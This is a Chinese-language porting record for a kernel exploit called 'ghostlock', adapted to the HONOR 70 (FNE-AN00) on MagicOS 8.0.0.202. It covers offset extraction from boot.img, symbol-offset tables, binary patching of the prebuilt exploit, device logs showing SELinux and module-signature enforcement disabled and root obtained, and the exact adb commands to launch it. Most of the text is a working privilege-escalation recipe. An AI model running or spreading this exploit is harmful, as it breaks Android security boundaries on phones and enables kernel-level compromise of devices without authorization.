# 荣耀 70（FNE-AN00）8.0.0.202 适配记录

本分支在 upstream `1cdaebd` 的基础上，为 **HONOR FNE-AN00 / MagicOS 8.0.0.202**
（内核 `5.4.289-qgki-gc5b795a0f72f`）补了一条离线偏移条目，并在真机上验证了
「W1 → W2 → KernelSU late-load」全链。

## 1. 基线

| 项 | 值 |
|---|---|
| 机型 | HONOR 70 / FNE-AN00（`ro.board.platform=lahaina`，SoC SM7325） |
| 系统 | MagicOS 8.0.0.202（Android 14） |
| 指纹 | `HONOR/FNE-AN00/HNFNE:14/HONORFNE-AN00/8.0.0.202C00E200R6P7:user/release-keys` |
| 内核 | `Linux 5.4.289-qgki-gc5b795a0f72f` aarch64 |
| 安全补丁 | 2025-05-01 |
| 分区方案 | A/B（`ro.boot.slot_suffix=_a`，`ro.build.ab_update=true`） |
| Bootloader | **未解锁**（本方案全程不改 boot / system 分区） |

`/proc/config.gz` 里与本方案相关的项：

```
CONFIG_LOCALVERSION="-qgki"
CONFIG_LOCALVERSION_AUTO=y
CONFIG_KALLSYMS_ALL=y
CONFIG_KALLSYMS_BASE_RELATIVE=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_IKCONFIG=y
CONFIG_IKCONFIG_PROC=y
CONFIG_LTO_CLANG=y
CONFIG_CFI_CLANG=y
CONFIG_CC_VERSION_TEXT="Android (6877366 based on r383902b1) clang version 11.0.2 ..."
```

## 2. 为什么原版不认这台机器

`root/exploit/src/core/main.c:86-107` 用 `strcmp(uts.release, known_offsets[i].uname_r)`
做**精确匹配**，失配即打印 `no offsets for kernel: 5.4.289-qgki-gc5b795a0f72f`
并退出。upstream 表里 5.4.289 只有 8.0.0.221 的那一条
（`5.4.289-qgki-gf6cb1f712a6e`），所以本机直接 `w1 rc=255`。

## 3. 偏移从哪来

全程离线，只需要一个 boot.img：

```bash
# 1) 取 boot 分区（真机 root 态下 dd；纯离线也可用 OTA 包里的 payload.bin）
adb shell 'su -c "dd if=/dev/block/by-name/boot_a of=/data/local/tmp/boot202.img bs=1M"'
adb pull /data/local/tmp/boot202.img
#   -> 100,663,296 B，ANDROID! v3，kernel_size 46,191,104，kernel 在 4096，
#      未压缩裸 ARM64 Image

# 2) 切内核 + 恢复 kallsyms（见 root/exploit/tools/kallsyms/GUIDE.md）
python tools/fne202/extract_kernel.py boot202.img work
kallsyms_finder --bit-size 64 work/kernel
#   -> 176,143 个符号（8.0.0.221 的 fne_syms.txt 是 176,133 个）

# 3) 与 8.0.0.221 逐符号对比
python tools/fne202/cmp_offsets.py root/ksu-late-load/fne_syms.txt work/kernel.kallsyms

# 4) 写入 offsets.h 后复核
python tools/fne202/verify_entry.py root/exploit/src/devices/fne/offsets.h work/kernel.kallsyms
#   -> 29 field(s) checked, 0 problem(s)
```

## 4. 与 8.0.0.221 的实际差异

条目写在 `root/exploit/src/devices/fne/offsets.h`（紧接 221 条目之后），
`STRUCT_OFFSETS_5_4`、`cfg_*`、`cred_*`、`kernel_phys_load` 全部沿用 221
——两个内核的 `runtime_struct_offsets` 在这台机器上没有变化。

| 组 | 字段 | 变化 |
|---|---|---|
| 相同 | `init_task` `init_cred` `init_uts_ns` `empty_zero_page` `root_task_group` `selinux_state` `sig_enforce` `kptr_restrict` `ashmem_misc` `nfulnl_logger` `loggers` `system_unbound_wq` `sysctl_bootid` | — |
| +0x320 | `selinux_blob_sizes` `security_hook_heads` `kmalloc_caches` `anon_pipe_buf_ops` `ashmem_fops` | 0x022F2F2C→0x022F306C 等 |
| +0x3C0 | `ashmem_ioctl`(+compat) `ashmem_mmap` `ashmem_open` `ashmem_release` `ashmem_show_fdinfo` | 0x002BAA88→0x002BAE48 等 |
| −0x010 | `configfs_read_file` `configfs_write_bin_file` `default_file_splice_read` `noop_llseek` `call_usermodehelper_exec_work` | 0x0063B6A8→0x0063B698 等 |

## 5. 不想装 NDK 时：直接补二进制

`root/exploit/ghostlock` 里 `known_offsets[]` 是静态数据（`.data.rel.ro`），
可以直接改：

```bash
python tools/fne202/patch_table.py \
    root/exploit/src/devices/fne/offsets.h \
    root/exploit/ghostlock ghostlock_202
```

工具用 6 个 u64 的签名定位到条目（文件偏移 `0x2d6c0`，`kernel_phys_load`
在 `0x2d6c8`），先逐槽与 `offsets.h` 比对（0 mismatch 才动手），再改写
16 个符号槽 + 等长替换 release 串（`0x485a` 处，26 字符同长，RELA 提供的
`.uname_r` 指针不受影响）。产物：

```
221104 bytes  sha256 fa1f494ead1000d59a8f5c44714da7cf64c422b0d1d26313977f51e0668976c5
```

这个产物已随分支提交为 `root/exploit/ghostlock.fne202`。`run_root.bat` 部署时会先
`adb shell uname -r`：命中 `gc5b795a0f72f` 就推 202 版，其余内核（221 / 224）继续用
原版 `root/exploit/ghostlock`。所以这台机器既不需要 NDK，也不用手工替换文件——直接
跑 `run_root.bat` 就行。

若之后改了 `offsets.h`，用上面的命令重新生成并覆盖 `ghostlock.fne202`，再核对
`changed 16 symbol slots` 与 sha256 是否与记录一致。

## 6. 真机结果（2026-11-10）

```
W1  : getenforce Enforcing -> Permissive，约 6.7 s
      [+] SELinux DISABLED
      [+] SIG_ENFORCE DISABLED   (sig_enforce target = kimage_base + 0x02A1E5E0)
W2  : child uid = 0，约 34.8 s
      [+] child is root!
      ksu_fne: runtime fake kallsyms written: 207919 syms, slide=0x1930000000
      [+] KernelSU module is loaded  (kernelsu 307200 2, OE+)
su -c id -> uid=0(root) gid=0(root) context=u:r:ksu:s0
ksud 3.3.0 (uapi: 2)；管理器 KernelSU v3.3.0 (32601) 显示「工作中 [越狱模式]」
```

### 关键参数：`GL_W1_ATTEMPTS=1`

用仓库默认的 `GL_W1_ATTEMPTS=2` 时，第二次 W1 会重复 `slab_drain`
（`src/core/main.c:1335-1365`：`waves = uptime>60s ? 5 : 2`、
`batch = 400 : 200`），fork 风暴让内核触发保护性重启——实测两次都在
`wave 4/5 … forked 400, killing` 之后 panic。**固定 1 次**是这台机器验证过的配方。

`root/host-scripts/run_w2.sh` 已经内置这条规则：部署时先 `adb shell uname -r`，
命中 `gc5b795a0f72f` 就把 `GL_W1_ATTEMPTS` 默认取 1（显式给环境变量仍可覆盖）。
所以走 `run_root.bat` 时不需要手工设置。

因此完整的冷启动命令是：

```bash
adb shell 'nohup env GL_W1_ATTEMPTS=1 /data/local/tmp/e202 --write1 > /data/local/tmp/w1.log 2>&1 &'
adb shell 'nohup env GL_W2_ROUNDS=2 GL_W2_CRED_ADJ=0 /data/local/tmp/e202 > /data/local/tmp/w2.log 2>&1 &'
```

## 7. 风险与限制

- **临时 root**：模块是运行时 `insmod` 的，重启即失效；KASLR 每次开机都在变，
  偏移表本身不会变，但 `slide.txt` 每次要重算。
- **不要写分区**：`boot_a` 可读可写，但没解锁 BL 的情况下写坏即砖，recovery
  也没有 adb 可用（这些机型的 recovery 不带 adbd）。
- **SELinux 会自己回到 Enforcing**：约 1–2 分钟后 `getenforce` 又变回强制，
  不影响 `su`（KSU 在 `u:r:ksu:s0` 域里工作），但 `setenforce 0` 会报 EINVAL。
- `/system` 等分区是 erofs 只读，`adb remount` / overlay 都不成立。
- 管理器必须与内核的 uapi 配套（本机 `ksud 3.3.0 / uapi 2` ↔ 管理器
  `v3.3.0 (32601)`），换分支版本会显示"未安装内核"。

## 8. 文件清单

| 路径 | 说明 |
|---|---|
| `root/exploit/src/devices/fne/offsets.h` | 新增 `5.4.289-qgki-gc5b795a0f72f` 条目 |
| `root/exploit/ghostlock.fne202` | 打上 202 偏移表的预编译 exploit（`run_root.bat` 按内核自动选用） |
| `tools/fne202/extract_kernel.py` | boot.img → 裸 ARM64 Image |
| `tools/fne202/cmp_offsets.py` | 两个内核的符号偏移逐字段对比 |
| `tools/fne202/verify_entry.py` | offsets.h 条目 ↔ 真实 kallsyms 复核 |
| `tools/fne202/patch_table.py` | 直接给预编译 `ghostlock` 补表（免 NDK） |
| `tools/fne202/README.md` | 工具用法 |
